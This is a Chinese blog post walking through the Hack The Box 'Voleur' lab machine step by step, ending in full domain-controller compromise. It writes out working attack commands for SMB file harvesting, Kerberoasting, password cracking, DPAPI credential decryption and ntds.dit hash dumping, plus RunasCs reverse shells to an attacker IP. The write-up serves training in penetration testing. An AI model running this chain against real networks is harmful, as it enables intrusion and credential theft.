> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzkwMzYyNzQ1NA==&mid=2247485754&idx=1&sn=62576740b3e02f2d5c133024b5133a35

#  HTB 第八赛季Voleur靶机：SMB泄漏/WSL备份/直捣域控  
原创 红队安全圈  红队安全圈   2025-07-11 12:00  
  
   
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2K9ohfEv3JP2mYJZmoFqadibP2NXm4ndPJ4BsaJLtbVvtsl3EYw8feSrIAFDTC9v6MaWm7MfNzJExg/640?wx_fmt=png&from=appmsg "")  
  
hackthebox 第八赛季的新靶机 Voleur，难度为中等，需要熟悉SMB敏感文件泄露，Excel密码破解，kerberos票据，恢复删除用户，DPAPI提权，ntds解密，最终拿到域控权限。  
##### 靶机地址  
  
https://app.hackthebox.com/machines/670  
##### 适合读者  
  
√ 红队渗透测试人员  
  
√ 企业安全运维人员  
  
√ CTF竞赛战队  
  
√ 想掌握链式攻击思维的安全从业者  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2ILKy0oho5qib3ibswMNzr1XR3Zw6V3jHsxhNpfFqibj39H8W87tzGOqhZMbV5TkFL7ys01zzGa9bTyg/640?wx_fmt=png&from=appmsg "null")  
  
# 一、信息收集  
### 端口扫描  

```
nmap -sT --min-rate 1000 -p- 10.10.11.76 -oA nmapscan/ports
```

  
从开发的端口来看又是一个 Windows 域控机器  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2ILKy0oho5qib3ibswMNzr1XRCVrXkEt6VWhjpqHAtFhagRAB3mYBxaCNicWXz8HmHPuPzWP9iamGPzQg/640?wx_fmt=png&from=appmsg "null")  
  
  
继续扫端口详情，得到域名
```
voleur.htb
```

  
，当前机器是域控
```
DC
```

  
，还安装了 WSL Ubuntu，SSH 端口是 2222  

```
nmap -sT -Pn -sV -sC -O -p53,135,139,445,464,2222,3268,3269,5985,9389,49664,49668,50611,64017,64018,64019,64046 10.10.11.76
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2ILKy0oho5qib3ibswMNzr1XRVcgicqENvjMzcKOzkFBo4TFucT4EesmsibWe31uLBC0NGDTzGO38A6zw/640?wx_fmt=png&from=appmsg "null")  
  
  
IP 域名添加到 hosts 中  

```
echo '10.10.11.76 voleur.htb dc.voleur.htb' >> /etc/hosts
```

  
同步一下时钟，避免时钟偏差导致 kerberos 认证失败  

```
ntpdate 10.10.11.76
```

# 二、漏洞探测  
### SMB 泄露敏感文件  
  
靶场给了个初始凭证 
```
ryan.naylor / HollowOct31Nyt
```

  
，先尝试探测 SMB  

```
nxc smb dc.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' # 失败
nxc smb dc.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k     # 成功
```

  
目标禁用了 ntlm 协议，加上
```
-k
```

  
参数使用 kerberos 协议认证成功  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2ILKy0oho5qib3ibswMNzr1XR7oE2lYEqmU2n5fF4cPs7RiaGbahJE2jJ9BRrCrIrXzMZEAJp3SVJznA/640?wx_fmt=png&from=appmsg "null")  
  
  
爬取下载共享文件  

```
nxc smb dc.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k -M spider_plus -o DOWNLOAD_FLAG=True
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2ILKy0oho5qib3ibswMNzr1XRQmagDIrtUzbT6GRUaSvYYEAwVQmHGyGM7DKvESic0wicc0MDuOBwYnGg/640?wx_fmt=png&from=appmsg "null")  
  
  
共享中有一个 Access_Review.xlsx 文件，打开发现有加密  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2ILKy0oho5qib3ibswMNzr1XR9AXVlTpw6dRibwxdBlUcthKQpTVnJSc4bbUlK3blpzd5KYMfO8rxiaLQ/640?wx_fmt=png&from=appmsg "null")  
  
  
用 office2john 转成哈希，再用 john 破解  

```
office2john Access_Review.xlsx > xlsx.hash
john --wordlist=/usr/share/wordlists/rockyou.txt xlsx.hash
```

  
得到 Excel 的密码  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2ILKy0oho5qib3ibswMNzr1XRbibebINyacpEcGiba5shwv7aJg95dB9bDX7AX7FFk7qvNxNWZOsSIGcg/640?wx_fmt=png&from=appmsg "null")  
  
  
Excel 里发现多个人员信息，包括姓名，职位，权限，备注信息里有 3 个用户有密码，其中
```
Todd.Wolfe
```

  
用户还被标红并提示已经删除  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2ILKy0oho5qib3ibswMNzr1XRyhWicicfUcYgl7xyjHDmKOsf1Nnw5ibR8vk5KdM5YoFBYGiaB9KKwBN7Yg/640?wx_fmt=png&from=appmsg "null")  
  
### WriteSPN  
  
svc_ldap 用户有 ldap 权限，用它把域信息拖一下  

```
bloodhound-ce-python -u svc_ldap -p 'M...n' -d voleur.htb -dc dc.voleur.htb -c all -ns 10.10.11.76 --zip
```

  
svc_ldap 对 svc_winrm 有
```
WriteSPN
```

  
权限  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2ILKy0oho5qib3ibswMNzr1XR3SJPMBeLBT4vlnicRia2NicBPh9WE1JbRTf4Aa10pDfNKcE3CC9DhEU6Q/640?wx_fmt=png&from=appmsg "null")  
  
  
后面要使用 kerberos 认证，先把配置文件修改如下 
```
vim /etc/krb5.conf
```

  

```
[libdefaults]
    default_realm = VOLEUR.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = false
    ticket_lifetime = 24h
    forwardable = true
    rdns = false

[realms]
    VOLEUR.HTB = {
        kdc = DC.voleur.htb
        admin_server = DC.voleur.htb
    }

[domain_realm]
    .voleur.htb = VOLEUR.HTB
    voleur.htb = VOLEUR.HTB
```

  
把 svc_ldap 的 TGT 票据导出，用 targetedKerberoast.py 自动尝试对所有用户或特定用户进行有针对性的 Kerberoast 攻击，获取哈希值，需要加上-k 参数使用 kerberos 认证  

```
impacket-getTGT 'voleur.htb/svc_ldap:M1......Vn'
export KRB5CCNAME=svc_ldap.ccache
python3 targetedKerberoast.py -v -d 'voleur.htb' -u 'svc_ldap' -k --dc-host dc.voleur.htb
```

  
抓到两个用户的 TGS 哈希  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2ILKy0oho5qib3ibswMNzr1XRIlGda7lK194db2KJiampMzFTtmAyhpwNm3SGqibdgGCTIia5VFkJHY4mw/640?wx_fmt=png&from=appmsg "null")  
  
### 爆破 TGS  
  
保存到文件中，用 hashcat 爆破出了 svc_winrm 的密码  

```
hashcat -m 13100 -a 0 hashs.txt /usr/share/wordlists/rockyou.txt
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2ILKy0oho5qib3ibswMNzr1XRKjr4TNZe10zibxib7qtQUaRK9y16jG4spbau04cKM1Jreb4wl7hR6ibdg/640?wx_fmt=png&from=appmsg "null")  
  
  
svc_winrm 使用 TGT 票据登录成功，在的桌面拿到第一个 flag⛳️  

```
impacket-getTGT 'voleur.htb/svc_winrm:AFi......9afi'
export KRB5CCNAME=svc_winrm.ccache
evil-winrm -i dc.voleur.htb -r voleur.htb
```

  
![](https://mmbiz.qpic.cn/mmbiz_jpg/5HsgFkdwV2ILKy0oho5qib3ibswMNzr1XRtMqtia5YBO7CpAv9FRk45nK0y3WcgJQAfyKw5xYmEbmygib1Micv3yZPA/640?wx_fmt=jpeg&from=appmsg "null")  
  
# 三、权限提升  
### 恢复已删除用户  
  
前面的 Excel 表得知 Todd.Wolfe 用户已经被删除，也可以手动查询被删除的用户再恢复，经测试 svc_winrm 用户没权限操作失败  
  
攻击机设置好监听，用 runas 反弹回一个 svc_ldap 用户的 shell  

```
.\RunasCs.exe svc_ldap M1......n cmd.exe -r 10.10.14.10:4446
```

  
svc_ldap 属于一个叫恢复用户的组  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2ILKy0oho5qib3ibswMNzr1XRrAboOJV4F1MqgkuT68HicsjWYHwZOEBp9tVg0kIdp6eLRicdgNbMkygQ/640?wx_fmt=png&from=appmsg "null")  
  
  
进入 powershell 交互，先查询被删除的对象中有 Todd.Wolfe 用户，再恢复这个用户  

```
powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects
Restore-ADObject -Identity '1c6b1.......69db'
```

  
Todd.Wolfe 被恢复成功，从"Deleted Objects"对象中移除  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/5HsgFkdwV2ILKy0oho5qib3ibswMNzr1XRwu8w8iahINFicqn3DLCLVTC0wCVmdVp7VUEVfXF3dKjPbBbtGOKEhbFg/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
excel 文件中有 Todd.Wolfe 的密码，现在可以继续用 runas 弹回它的 shell 了  

```
.\RunasCs.exe Todd.Wolfe N......14 cmd.exe -r 10.10.14.10:4447
```

### DPAPI  
  
上传 winpeas 收集一下可能的提权信息，没什么大的发现，有个 DPAPI 主密钥文件，但是没有加密的文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2ILKy0oho5qib3ibswMNzr1XRZ29m1eTpc0tQMRWlMHVibVh3I9NSBHUSDZz8DEZAxD6zQicUy8bVA8DA/640?wx_fmt=png&from=appmsg "null")  
  
  
Todd.Wolfe 的职位是
```
Second-Line Support Technician
```

  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2ILKy0oho5qib3ibswMNzr1XRTK0Jq24ykPuLjNbsAJiaXiaVibrOYR6lecOgic553JicCjAal3AHxBXjqXw/640?wx_fmt=png&from=appmsg "null")  
  
  
同时在 C 盘根目录有个 IT 文件夹，里面有个名为
```
Second-Line Support
```

  
的文件夹，继续翻文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2ILKy0oho5qib3ibswMNzr1XRNlGYKUayNPmlu8lyWgAAdkPl9WibNvkibWXo4ic32E14F8fvW52ltnKFA/640?wx_fmt=png&from=appmsg "null")  
  
  
经过不断的翻找，在里面找到 DPAPI 主密钥文件和一个加密凭证，把他们拖回来解密一下  

```
# master key 文件
c:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110\08949382-134f-4c63-b93c-ce52efc0aa88

# 加密的凭证
c:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Credentials\772275FAD58525253490A9B0039791D3
```

  
PAPI 解密需要这几样东西  
- • 用户密码  
  
- • 用户 SID 值  
  
- • 主密钥文件  
  
- • 需要被解密的凭证文件  
  

```
# 先解密 master key
impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -password 'Nig......14' -sid S-1-5-21-3927696377-1337352550-2781715495-1110

# 再用 master key 解密被加密的凭证
impacket-dpapi credential -f 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d......650a83
```

  
解密后发现了
```
Jeremy.Combs
```

  
用户和密码  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2ILKy0oho5qib3ibswMNzr1XRtYgkXUl2J7VzUXP11OLpZyljicw9yTuxE1Pia4N8lqp0UQTB7cnoaCdg/640?wx_fmt=png&from=appmsg "null")  
  
### WSL 备份文件  
  
继续用 runas 把 Jeremy.Combs 用户反弹 shell 回来  

```
.\RunasCs.exe jeremy.combs qT3......4m cmd.exe -r 10.10.14.10:4448
```

  
在 C 盘 IT 目录下找到跟他有关的目录，并且发现了一个 ssh 私钥、一个笔记、以及一个备份目录，访问备份目录提示没有权限  
  
从笔记中看到这个备份文件跟电脑上安装的 WSL 系统有关，前面端口扫描的时候已经得知 WSL 是个 Ubuntu，SSH 端口是 2222  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/5HsgFkdwV2ILKy0oho5qib3ibswMNzr1XREcEmxJjK7Y8Ydv0eQZpHUzp1nnWq4jwOseWb3c8NFvtNvyvNmbQysA/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
把私钥下回来给 600 权限，用
```
svc_backup
```

  
用户名登录成功，在备份目录中发现域控的 ntds，system 等文件  

```
ssh -i id_rsa -p 2222 &#34;svc_backup@dc.voleur.htb&#34;

# 下载回来在本地解密
scp -i id_rsa -P 2222 -r &#34;svc_backup@dc.voleur.htb:/mnt/c/IT/Third-Line Support/Backups&#34; ./
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/5HsgFkdwV2ILKy0oho5qib3ibswMNzr1XRvQcmL9r4pNxOeib7LxSyJZIkxuSll7Wpq1sia9DzrabhdbVRPnp3MVOA/640?wx_fmt=png&from=appmsg "null")  
  
  
impacket-secretsdump 解密哈希  

```
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

  
![](https://mmbiz.qpic.cn/mmbiz_jpg/5HsgFkdwV2ILKy0oho5qib3ibswMNzr1XRYWg0DkrfzyMA3v0SGJWwUic53KMkcqpcNEoD2NFu09DUS823wsnAGPQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
获取 administrator 的 TGT 票据，使用票据登录成功，在桌面找到 root flag ⛳️  

```
impacket-getTGT -hashes aad3......ad2 'voleur.HTB/administrator'
export KRB5CCNAME=administrator.ccache
evil-winrm -i dc.voleur.htb -r voleur.htb
```

  
![](https://mmbiz.qpic.cn/mmbiz_jpg/5HsgFkdwV2ILKy0oho5qib3ibswMNzr1XRO4sz1nZ9YvortVYia2M1YvTUHNHA1eweh0EgOILPVFmFdiazXibpzNMkg/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
   
  
欢迎关注   
红队安全圈 👇  
  
  
加入聊天群，关注后回复   
进群  
  
如果文章对你有帮助，给个   
一键四连 吧  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/5HsgFkdwV2J3Ykl5xDepRoqkSBlQKAEIEx0DHiaQHx6sBYGNDAI6Eia2ZnZLLsHzD8yxEGEVbrzzTL4Shrf7iaWWw/640?wx_fmt=gif&from=appmsg "")  
  
